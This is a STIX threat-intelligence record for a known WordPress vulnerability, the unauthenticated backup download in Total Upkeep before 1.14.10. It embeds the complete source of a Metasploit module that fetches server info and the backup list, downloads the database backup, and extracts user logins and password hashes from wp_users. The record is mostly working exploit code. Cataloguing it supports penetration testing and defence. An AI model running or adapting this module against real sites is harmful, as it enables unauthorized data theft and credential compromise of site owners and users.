{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9c68e7f2-29c6-4aa7-9b18-b3e138adb29c",
    "created": "2024-08-14T16:29:04.559424Z",
    "modified": "2024-08-14T16:29:04.559428Z",
    "name": "WordPress Total Upkeep Unauthenticated Backup Downloader",
    "description": " This module exploits an unauthenticated database backup vulnerability in WordPress plugin 'Boldgrid-Backup' also known as 'Total Upkeep' version < 1.14.10. First, `env-info.php` is read to get server information.  Next, `restore-info.json` is read to retrieve the last backup file.  That backup is then downloaded, and any sql files will be parsed looking for the wp_users INSERT statement to grab user creds.  'References' => [ ['EDB', '49252']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/wp_total_upkeep_downloader.rb",
            "external_id": "wp_total_upkeep_downloader.rb"
        },
        {
            "source_name": "WPVDB",
            "external_id": "10503"
        },
        {
            "source_name": "reference",
            "url": "https://plugins.trac.wordpress.org/changeset/2439376/boldgrid-backup"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'WordPress Total Upkeep Unauthenticated Backup Downloader',\n        'Description' => %q{\n          This module exploits an unauthenticated database backup vulnerability in WordPress plugin\n          'Boldgrid-Backup' also known as 'Total Upkeep' version < 1.14.10.\n          First, `env-info.php` is read to get server information.  Next, `restore-info.json` is\n          read to retrieve the last backup file.  That backup is then downloaded, and any sql\n          files will be parsed looking for the wp_users INSERT statement to grab user creds.\n        },\n        'References' => [\n          ['EDB', '49252'],\n          ['WPVDB', '10502'],\n          ['WPVDB', '10503'],\n          ['URL', 'https://plugins.trac.wordpress.org/changeset/2439376/boldgrid-backup']\n        ],\n        'Author' => [\n          'Wadeek', # Vulnerability discovery\n          'h00die' # Metasploit module\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [IOC_IN_LOGS]\n        },\n        'DisclosureDate' => '2020-12-12',\n        'License' => MSF_LICENSE\n      )\n    )\n  end\n\n  def run_host(ip)\n    unless wordpress_and_online?\n      fail_with Failure::NotVulnerable, \"#{ip} - Server not online or not detected as wordpress\"\n    end\n\n    checkcode = check_plugin_version_from_readme('boldgrid-backup', '1.14.10')\n    unless [Msf::Exploit::CheckCode::Vulnerable, Msf::Exploit::CheckCode::Appears, Msf::Exploit::CheckCode::Detected].include?(checkcode)\n      fail_with Failure::NotVulnerable, \"#{ip} - A vulnerable version of Boldgrid Backup was not found\"\n    end\n    print_good(\"#{ip} - Vulnerable version of Boldgrid Backup detected\")\n\n    print_status(\"#{ip} - Obtaining Server Info\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'wp-content', 'plugins', 'boldgrid-backup', 'cli', 'env-info.php')\n    })\n\n    fail_with Failure::Unreachable, \"#{ip} - Connection failed\" unless res\n    fail_with Failure::NotVulnerable, \"#{ip} - Connection failed. Non 200 code received\" if res.code != 200\n    begin\n      data = JSON.parse(res.body)\n    rescue StandardError\n      fail_with Failure::NotVulnerable, \"#{ip} - Unable to parse JSON output.  Check response: #{res.body}\"\n    end\n    output = []\n    data.each do |k, v|\n      output << \"  #{k}: #{v}\"\n    end\n    print_good(\"#{ip} - \\n#{output.join(\"\\n\")}\")\n    path = store_loot(\n      'boldgrid-backup.server.info',\n      'text/json',\n      ip,\n      data,\n      'env-info.json'\n    )\n    print_good(\"#{ip} - File saved in: #{path}\")\n\n    print_status(\"#{ip} - Obtaining Backup List from Cron\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'wp-content', 'plugins', 'boldgrid-backup', 'cron', 'restore-info.json')\n    })\n    fail_with Failure::Unreachable, \"#{ip} - Connection failed\" unless res\n    fail_with Failure::NotVulnerable, \"#{ip} - No database backups detected\" if res.code == 404\n    fail_with Failure::NotVulnerable, \"#{ip} - Connection failed. Non 200 code received\" if res.code != 200\n\n    begin\n      data = JSON.parse(res.body)\n    rescue StandardError\n      fail_with Failure::NotVulnerable, \"#{ip} - Unable to parse JSON output.  Check response: #{res.body}\"\n    end\n    output = []\n    data.each do |k, v|\n      output << \"  #{k}: #{v}\"\n    end\n    print_good(\"#{ip} - \\n#{output.join(\"\\n\")}\")\n    path = store_loot(\n      'boldgrid-backup.backup.info',\n      'text/json',\n      ip,\n      data,\n      'restore-info.json'\n    )\n    print_good(\"#{ip} - File saved in: #{path}\")\n    unless data['filepath']\n      print_bad(\"#{ip} - no file found\")\n    end\n    # pull a url from the local file system path\n    path = data['filepath'].sub(data['ABSPATH'], '')\n    print_status(\"#{ip} attempting download of #{path}\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, path)\n    })\n    fail_with Failure::Unreachable, \"#{ip} - Connection failed\" unless res\n    fail_with Failure::NotVulnerable, \"#{ip} - Unable to download\" if res.code == 404\n    fail_with Failure::NotVulnerable, \"#{ip} - Connection failed. Non 200 code received\" if res.code != 200\n    path = store_loot(\n      'boldgrid-backup.backup.zip',\n      'application/zip',\n      ip,\n      res.body,\n      path.split('/').last\n    )\n    print_good(\"#{ip} - Database backup (#{res.body.bytesize} bytes) saved in: #{path}\")\n\n    Zip::File.open(path) do |zip_file|\n      # Handle entries one by one\n      zip_file.each do |entry|\n        # Extract to file\n        next unless entry.name.ends_with?('.sql')\n\n        print_status(\"#{ip} - Attempting to pull creds from #{entry}\")\n        f = entry.get_input_stream.read\n        f.split(\"\\n\").each do |l|\n          next unless l.include?('INSERT INTO `wp_users` VALUES ')\n\n          columns = ['user_login', 'user_pass']\n          table = Rex::Text::Table.new('Header' => 'wp_users', 'Indent' => 1, 'Columns' => columns)\n          l.split('),(').each do |user|\n            user = user.split(',')\n            username = user[1].strip\n            username = username.start_with?(\"'\") ? username.gsub(\"'\", '') : username\n            hash = user[2].strip\n            hash = hash.start_with?(\"'\") ? hash.gsub(\"'\", '') : hash\n            create_credential({\n              workspace_id: myworkspace_id,\n              origin_type: :service,\n              module_fullname: fullname,\n              username: username,\n              private_type: :nonreplayable_hash,\n              jtr_format: Metasploit::Framework::Hashes.identify_hash(hash),\n              private_data: hash,\n              service_name: 'Wordpress',\n              address: ip,\n              port: datastore['RPORT'],\n              protocol: 'tcp',\n              status: Metasploit::Model::Login::Status::UNTRIED\n            })\n            table << [username, hash]\n          end\n          print_good(table.to_s)\n        end\n      end\n    end\n    print_status(\"#{ip} - finished processing backup zip\")\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2020-12-12"
}